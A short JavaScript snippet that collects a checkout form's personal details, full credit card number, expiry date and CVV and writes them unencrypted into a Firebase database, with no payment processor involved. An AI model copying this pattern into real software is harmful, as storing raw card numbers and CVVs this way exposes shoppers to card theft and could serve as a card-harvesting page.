const dbRef = firebase.database().ref();
const detailsRef = dbRef.child('details');
detailsRef.on('child_added', function(snapshot, prevChildKey) {
  var newPost = snapshot.val();
});

//record payment details to Firebase database
function send() {
  var name = document.getElementById('fname').value;
  var email = document.getElementById('email').value;
  var address = document.getElementById('adr').value;
  var city = document.getElementById('city').value;
  var state = document.getElementById('state').value;
  var zipcode = document.getElementById('zip').value;
  var ccardname = document.getElementById('cname').value;
  var ccardnum = document.getElementById('ccnum').value;
  var expmonth = document.getElementById('expmonth').value;
  var expyear = document.getElementById('expyear').value;
  var cvv = document.getElementById('cvv').value;
  detailsRef.push().set({
    name: name,
    email: email,
    address: address,
    city: city,
    state: state,
    zipcode: zipcode,
    ccardname: ccardname,
    ccardnum: ccardnum,
    expmonth: expmonth,
    expyear: expyear,
    cvv: cvv
  });
}
